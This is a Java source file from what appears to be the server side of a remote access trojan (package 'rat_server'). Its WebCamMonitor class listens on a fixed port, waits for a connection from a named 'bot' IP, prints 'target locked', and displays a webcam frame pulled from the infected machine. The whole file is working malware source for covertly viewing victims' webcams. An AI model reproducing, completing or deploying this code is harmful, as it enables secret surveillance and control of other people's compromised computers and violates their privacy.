package rat_server;

import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OptionalDataException;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

public class WebCamMonitor implements Runnable
{
    private ServerSocket serverSocket;
    private String bot_ip_address;
    
    public WebCamMonitor()
    {
        try
        {
            serverSocket=new ServerSocket(54325);
        }
        catch(IOException exc)
        {
            
        }
    }

    void getWebCamFrame(String bot_ip_address)
    {
        this.bot_ip_address=bot_ip_address;
        Thread thread=new Thread(this);
        thread.start();
    }
    
    @Override
    public void run()
    {
        Socket socket;
        try
        {
            do
                socket=serverSocket.accept();
            while(!socket.getInetAddress().getHostAddress().equals(bot_ip_address));
            System.out.println("target locked");
            ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
            ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
            System.out.println("command sent");
            JOptionPane.showMessageDialog(null,null,bot_ip_address+"'s WebCam", 0,
                                          new ImageIcon((BufferedImage)ois.readObject()));
            socket.close();
        }
        catch(OptionalDataException exc)
        {
            JOptionPane.showMessageDialog(null,bot_ip_address+" has no WebCam available!");
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
        }
        catch(ClassNotFoundException exc)
        {
            JOptionPane.showMessageDialog(null,bot_ip_address+" has no WebCam available!");
            exc.printStackTrace();
        }
        
    }
}
